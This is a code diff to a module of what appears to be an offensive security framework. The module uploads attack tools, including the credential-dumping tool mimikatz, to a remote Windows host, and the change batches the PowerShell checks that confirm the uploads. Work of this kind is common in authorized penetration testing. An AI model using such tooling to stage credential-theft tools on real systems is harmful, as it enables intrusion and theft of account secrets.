@@ -72,6 +72,7 @@ class PopulateWinModule(KoiModule):
         print()
 
         results: dict[str, str] = {}
+        uploaded_files: dict[str, tuple[str, str]] = {}  # {name: (dest, source)}
 
         for name, url in TOOLS.items():
             dest = f"{out_dir}\\{name}"
@@ -82,14 +83,11 @@ class PopulateWinModule(KoiModule):
                     ok  = self._upload_bytes(raw, dest)
                     if ok:
                         time.sleep(1.0)
-                        ok = self._win_query(f"(Test-Path '{dest}').ToString()").strip().lower() == "true"
+                        uploaded_files[name] = (dest, source)
+                    else:
+                        results[name] = "FAILED"
                 except Exception as exc:
-                    ok = False
                     results[name] = f"error: {exc}"
-                    continue
-            if ok and source == "cache":
-                self.ok(f"Using cached {name} ({cache_path(cache_name)})")
-            results[name] = dest if ok else "FAILED"
 
         dest = f"{out_dir}\\mimikatz.exe"
         with self.spinner("Downloading mimikatz..."):
@@ -99,14 +97,30 @@ class PopulateWinModule(KoiModule):
                 ok  = self._upload_bytes(raw, dest)
                 if ok:
                     time.sleep(1.0)
-                    ok = self._win_query(f"(Test-Path '{dest}').ToString()").strip().lower() == "true"
+                    uploaded_files["mimikatz.exe"] = (dest, source)
+                else:
+                    results["mimikatz.exe"] = "FAILED"
             except Exception as exc:
-                ok = False
                 results["mimikatz.exe"] = f"error: {exc}"
-        if ok and source == "cache":
-            self.ok(f"Using cached mimikatz.exe ({cache_path(MIMIKATZ_ZIP_CACHE_NAME)})")
-        if "mimikatz.exe" not in results:
-            results["mimikatz.exe"] = dest if ok else "FAILED"
+
+        # Batch-verify all uploaded files in one query
+        if uploaded_files:
+            with self.spinner("Verifying uploads..."):
+                paths_expr = "@(" + ",".join(f"'{d}'" for d, _ in uploaded_files.values()) + ")"
+                verify_raw = self._win_query(f"({paths_expr} | ForEach-Object {{(Test-Path $_).ToString()}}) -join 'KOISEP'")
+                exists_list = [x.strip().lower() == "true" for x in verify_raw.split("KOISEP")]
+
+            for (name, (dest, source)), exists in zip(uploaded_files.items(), exists_list):
+                if source == "cache":
+                    cache_name = f"armory_{name}" if name != "mimikatz.exe" else MIMIKATZ_ZIP_CACHE_NAME
+                    self.ok(f"Using cached {name} ({cache_path(cache_name)})")
+                results[name] = dest if exists else "FAILED"
+
+            # Safety net: if the batched query returned fewer entries than
+            # expected (truncated output), don't silently drop those tools.
+            for name in uploaded_files:
+                if name not in results:
+                    results[name] = "FAILED"
 
         display = {}
         for name, val in results.items():
